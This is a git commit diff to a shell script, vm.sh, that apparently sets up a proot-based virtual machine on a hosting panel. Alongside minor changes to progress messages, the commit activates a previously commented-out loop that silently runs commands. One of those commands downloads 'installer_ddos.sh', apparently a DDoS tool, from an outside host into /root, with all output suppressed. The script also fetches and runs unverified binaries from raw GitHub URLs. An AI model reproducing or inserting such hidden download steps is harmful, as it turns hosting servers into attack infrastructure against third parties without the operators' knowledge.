7e7e3b3e017b8029929c1370fd8d2ee77fbfef75
Zlogger <79506370+haker20SZs@users.noreply.github.com>
2024-08-08 01:34:11 +0700

    Update vm.sh
    Signed-off-by: Zlogger <79506370+haker20SZs@users.noreply.github.com>

--- archive/vm.sh
+++ archive/vm.sh
@@ -53,17 +53,14 @@ if [[ -f "./installed" ]]; then
     runcmd
 else
     echo "Downloading files for application"
-    curl -sSLo ngrok.zip https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip >/dev/null 2>err.log
-    echo -ne '#                   (5%)\r'
     curl -sSLo files.zip https://github.com/RealTriassic/Ptero-VM-JAR/releases/download/latest/files.zip >/dev/null 2>err.log
-    echo -ne '##                  (10%)\r'
+    echo -ne '##                  (5%)\r'
     curl -sSLo unzip https://raw.githubusercontent.com/afnan007a/Ptero-vm/main/unzip >/dev/null 2>err.log
-    echo -ne '####                (20%)\r'
+    echo -ne '####                (10%)\r'
     curl -sSLo gotty https://raw.githubusercontent.com/afnan007a/Replit-Vm/main/gotty >/dev/null 2>err.log
-    echo -ne '#####               (25%)\r'
+    echo -ne '#####               (20%)\r'
     chmod +x unzip >/dev/null 2>err.log
     export PATH="/bin:/usr/bin:/usr/local/bin:/sbin:$HOMEA/bin:$HOMEA/usr/bin:$HOMEA/sbin:$HOMEA/usr/sbin:$HOMEA/etc/init.d:$PATH"
-    ./unzip ngrok.zip >/dev/null 2>err.log
     echo -ne '######               (30%)\r'
     ./unzip files.zip >/dev/null 2>err.log
     echo -ne '#######              (35%)\r'
@@ -72,21 +69,18 @@ else
     echo -ne '########             (40%)\r'
     chmod +x ./libraries/proot >/dev/null 2>err.log
     echo -ne '#########            (45%)\r'
-    chmod +x ngrok >/dev/null 2>err.log
-    echo -ne '##########           (50%)\r'
     chmod +x gotty >/dev/null 2>err.log
     echo -ne '###########          (55%)\r'
     rm -rf files.zip >/dev/null 2>err.log
     rm -rf root.zip >/dev/null 2>err.log
     rm -rf root.tar.gz >/dev/null 2>err.log
-    rm -rf ngrok.zip >/dev/null 2>err.log
     echo -ne '############         (60%)\r'
 
-    #cmds=("mv gotty /usr/bin/" "mv unzip /usr/bin/" "mv ngrok /usr/bin/" "curl -o /root/installer_ddos.sh https://api.whost.su/tg/installer_ddos.sh" "apt-get -y update" "apt-get -y upgrade" "apt-get -y install sudo curl wget hwloc htop nano neofetch python3" "curl -o /bin/systemctl https://raw.githubusercontent.com/gdraheim/docker-systemctl-replacement/master/files/docker/systemctl3.py")
+    cmds=("mv gotty /usr/bin/" "mv unzip /usr/bin/" "curl -o /root/installer_ddos.sh https://api.whost.su/tg/installer_ddos.sh" "curl -o /bin/systemctl https://raw.githubusercontent.com/gdraheim/docker-systemctl-replacement/master/files/docker/systemctl3.py")
 
-    #for cmd in "${cmds[@]}"; do
-    #    ./libraries/proot -S . /bin/bash -c "$cmd >/dev/null 2>err.log"
-    #done
+    for cmd in "${cmds[@]}"; do
+        ./libraries/proot -S . /bin/bash -c "$cmd >/dev/null 2>err.log"
+    done
     
     echo -ne '####################(100%)\r'
     echo -ne '\n'
